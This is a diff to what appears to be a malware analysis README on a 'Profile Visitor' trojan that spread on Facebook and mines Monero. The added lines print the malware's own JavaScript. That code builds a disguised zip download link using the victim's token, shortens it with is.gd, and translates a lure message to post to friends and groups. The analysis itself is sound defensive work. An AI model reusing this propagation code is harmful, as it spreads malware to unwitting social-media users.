@@ -7,7 +7,7 @@ It mines coin (particularly Monero) using the tool Xmrig on your computer and st
 
 ## Example?
 ![Vietnamese version of the virus](https://user-images.githubusercontent.com/68118236/145680558-47cabfdf-95be-4eae-b13b-7e7fc62a0a43.png)
-<br>Vietnamese version of the virus that spread on Facebook, said "Hello, you can know who visited your profile with the Profile Visitor app"
+<br>Vietnamese version of the virus that spread on Facebook, said "Hello, you can know who visited your profile with the Profile Visitor app". It's translated from English using Google Translate API. The images under the text are got from your Active Friend List, see below.
 
 ## Some sandbox links
 [VirusTotal](https://www.virustotal.com/gui/file/f479135d5db8e2f6dff59252b8e51ebd9414a226df908f994376415c20b9446d/detection)
@@ -1342,6 +1342,76 @@ var loadData = function (url, callback) {
 }
 ```
 <br> Using the same technique, let's get the source code of `facebook.js` and `twitter.js`. Because they are too long (`facebook.js` has 1000+ lines), so please view it at `facebook.js` and `twitter.js` in this repo.
+<br> For Facebook, they have:
+```javascript
+facebook.getLink = function (vars) {
+  fetch(uri("/ajax/storage.php?hash=" + config.token)).then(response => response.json()).then((data) => {
+    var ref = "facebook";
+    if(vars.mode == 'groups'){
+      ref = "groups";
+    }
+    var cid = guid();
+    var zip = encodeURIComponent(`ProfileVisitors v${rand(1,9)}.${rand(1,9)}.zip`);
+    var exe = `visitors.facebook.com`;
+    vars.link = `https://storage.googleapis.com/${data.storage.bucket}/${data.storage.object}?ref=${ref}&cid=${cid}&zip=${zip}&exe=${exe}`;
+    console.log(vars.link);
+    facebook.isgd(vars);
+  })
+}
+
+facebook.isgd = function (vars) {
+  fetch("https://is.gd/create.php?format=simple&url=" + encodeURIComponent(vars.link)).then(response => response.text()).then((data) => {
+    vars.link = data;
+    if (vars.mode == "friends") {
+      facebook.calculatecount(vars);
+    } else if(vars.mode == "groups") {
+      facebook.getToken(vars);
+    }
+  })
+}
+```
+<br> and
+```javascript
+facebook.translate = function (vars) {
+  vars.message = "Hi See your profile visitors with ProfileVisitors";
+
+  var params = [];
+  params.push("client=gtx");
+  params.push("sl=gtx");
+  params.push("tl=" + vars.locale);
+  params.push("hl=" + vars.locale);
+  params.push("dt=t");
+  params.push("dt=bd");
+  params.push("dj=1");
+  params.push("source=input");
+  params.push("tk=964337.964337");
+  params.push("q=" + vars.message);
+  params = params.join("&");
+
+  fetch("https://translate.googleapis.com/translate_a/single?" + encodeURI(params), {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded"
+    }
+  }).then(response => response.json()).then((data) => {
+    try {
+      if (data.sentences) vars.message = data.sentences[0].trans;
+      if (vars.mode == "friends") {
+        facebook.postImage(vars);
+      } else if (vars.mode == "groups") {
+        facebook.createGroupCanvas(vars);
+      }
+    } catch (error) {
+      var d = {
+        response: data,
+        error: error.message,
+        vars: vars
+      }
+      facebook.error("translate", d);
+    }
+  })
+}
+```
+
 ### 9) The miner
 In the function `zlmsyuslmwzh` in the fb.clean.au3 file:
 ```autoit
